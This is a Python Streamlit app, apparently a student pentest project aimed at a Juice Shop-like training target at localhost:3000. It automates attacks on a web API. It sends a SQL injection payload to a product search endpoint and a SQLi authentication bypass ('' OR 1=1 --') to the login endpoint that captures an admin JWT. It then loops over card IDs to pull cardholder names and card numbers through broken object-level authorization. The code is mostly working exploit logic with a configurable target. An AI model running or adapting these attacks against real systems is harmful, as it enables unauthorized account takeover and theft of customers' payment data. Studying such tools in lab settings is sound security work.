import streamlit as st
import requests
import pandas as pd
import time
from datetime import datetime

# Page Configuration
st.set_page_config(page_title="API Penetrator Engine", layout="wide", initial_sidebar_state="expanded")

# Custom Cyber Header
st.markdown("""
    <div style="background-color:#1e1e2e; padding:20px; border-radius:10px; border-left: 5px solid #ff4b4b; margin-bottom:20px;">
        <h1 style="color:#ffffff; margin:0;">🛡️ Advanced API Penetration Testing & Exploitation Framework</h1>
        <p style="color:#a4a4c1; margin:5px 0 0 0;">Engineered by: <b>Mohammad</b> | Cybersecurity Specialization</p>
    </div>
""", unsafe_allow_html=True)

# Sidebar Configuration
st.sidebar.markdown("### 🎯 Target Scope")
target_url = st.sidebar.text_input("Target Base URL:", value="http://localhost:3000")
st.sidebar.markdown("---")
st.sidebar.markdown("### 🚀 Attack Controller")
start_scan = st.sidebar.button("Launch Automated Pentest Pipeline", use_container_width=True)

# Main Dashboard Interface
if start_scan:
    # 1. Live Terminal Logs Simulation
    st.subheader("🖥️ Live Execution Logs")
    log_area = st.empty()
    logs = []
    
    def update_logs(message):
        logs.append(f"[{datetime.now().strftime('%H:%M:%S')}] {message}")
        log_area.code("\n".join(logs), language="text")
        time.sleep(0.4)
        
    update_logs("[+] Initializing connection to target API scope...")
    update_logs(f"[+] Target verified: {target_url}")
    
    # --- Module 1: SQLi ---
    update_logs("[~] Launching Module 1: SQL Injection Scanner on Product Search...")
    sqli_success = False
    try:
        res_sqli = requests.get(f"{target_url}/rest/products/search", params={'q': "')) OR 1=1 --"}, timeout=5)
        if res_sqli.status_code == 200 and "data" in res_sqli.text:
            sqli_success = True
            update_logs("[🚨] CRITICAL: SQL Injection confirmed on search endpoint!")
        else:
            update_logs("[-] Module 1: Search endpoint appears secure against data leak payload.")
    except:
        update_logs("[-] Error: Connection timeout on Module 1.")

    # --- Module 2: Auth Bypass ---
    update_logs("[~] Launching Auth Module: Attempting SQLi Authentication Bypass...")
    token = None
    try:
        res_login = requests.post(f"{target_url}/rest/user/login", json={"email": "' OR 1=1 --", "password": "xyz"}, timeout=5)
        if res_login.status_code == 200:
            token = res_login.json().get('authentication', {}).get('token')
            update_logs("[🚨] SUCCESS: Password bypass successful! Administrative privileges hijacked.")
            update_logs(f"[+] Active JWT Token captured: {token[:25]}...")
        else:
            update_logs("[-] Auth Module: Authentication bypass failed.")
    except:
        update_logs("[-] Error: Connection timeout on Auth Module.")

    # --- Module 3: BOLA ---
    bola_data = []
    if token:
        update_logs("[~] Launching Module 3: Authenticated BOLA Fuzzing Pipeline...")
        headers = {"Authorization": f"Bearer {token}", "Accept": "application/json"}
        
        for card_id in range(1, 6):
            update_logs(f"[~] Fuzzing Resource ID: {card_id}")
            try:
                res_b = requests.get(f"{target_url}/api/Cards/{card_id}", headers=headers, timeout=5)
                if res_b.status_code == 200:
                    data = res_b.json().get('data', {})
                    bola_data.append({
                        "Resource ID": f"Card #{card_id}", 
                        "Card Holder": data.get('fullName'), 
                        "Masked Number": data.get('cardNum'), 
                        "Status": "🚨 CRITICAL LEAK"
                    })
                    update_logs(f"[🚨] EXPLOIT SUCCESS: Unauthorized data leaked for Card ID {card_id}!")
                else:
                    bola_data.append({
                        "Resource ID": f"Card #{card_id}", "Card Holder": "N/A", "Masked Number": "N/A", "Status": "🛡️ Secure"
                    })
            except:
                pass
    
    update_logs("[+] Penetration testing pipeline execution complete.")
    st.markdown("---")
    
    # High-Level Metrics Layout
    col1, col2, col3 = st.columns(3)
    with col1:
        st.metric(label="SQL Injection Vulnerability", value="VULNERABLE 🚨" if sqli_success else "SECURE 🛡️")
    with col2:
        st.metric(label="Auth Bypass Status", value="EXPLOITED 💥" if token else "SECURE 🛡️")
    with col3:
        leaked_count = sum(1 for r in bola_data if "🚨" in r["Status"]) if bola_data else 0
        st.metric(label="BOLA Leaked Financial Records", value=f"{leaked_count} Records")

    st.markdown("---")

    # Display Captured Session Token & Data Matrix
    if token:
        st.success("🔑 Administrative JWT Token Captured Successfully!")
        st.code(token, language="text")

    st.subheader("📋 Captured Customer Payment Details via BOLA")
    if bola_data:
        df = pd.DataFrame(bola_data)
        st.dataframe(df, use_container_width=True)
    else:
        st.info("No leaked data maps available. Authentication bypass was not triggered.")

else:
    # Beautiful Welcome screen
    st.markdown("""
        <div style="text-align: center; padding: 50px;">
            <h2 style="color: #4f4f4f;">💡 System Idle & Ready</h2>
            <p style="color: #7a7a7a; max-width: 600px; margin: 0 auto;">
                The offensive pipeline engine is locked and loaded. Configure your target environment URL in the left sidebar and launch the framework to execute real-time automated mapping.
            </p>
        </div>
    """, unsafe_allow_html=True)